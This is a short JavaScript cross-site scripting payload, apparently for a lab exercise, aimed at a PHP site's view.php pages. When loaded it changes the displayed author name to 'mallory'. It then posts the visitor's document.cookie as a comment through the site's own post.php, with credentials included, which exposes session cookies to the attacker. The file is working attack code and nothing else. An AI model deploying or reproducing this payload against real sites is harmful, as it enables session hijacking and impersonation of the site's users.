let npXSS = () => {
  if (
    !window.location.pathname.includes("/view.php") ||
    !window.location.search.includes("id=")
  ) {
    return;
  }

  let authorContent = document.getElementById("author").innerHTML.split(" ");
  authorContent[2] = "mallory";

  document.getElementById("author").innerHTML = authorContent.join(" ");
};

let getID = () => {
  const paramsArr = window.location.search.split("&");
  for (let i = 0; i < paramsArr.length; i++) {
    if (paramsArr[i].includes("id=")) {
      return paramsArr[i].split("=")[1];
    }
  }
};

let leakCookies = async (postID) => {
  if (
    !window.location.pathname.includes("/view.php") ||
    !window.location.search.includes("id=")
  ) {
    return;
  }

  let url = window.location.href.split("/");
  url.pop();
  url.push("post.php");
  url = url.join("/");

  const ret = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "comment=" + document.cookie + "&form=comment&parent=" + postID,
  });
  console.log(ret);
};

npXSS();
leakCookies(getID());
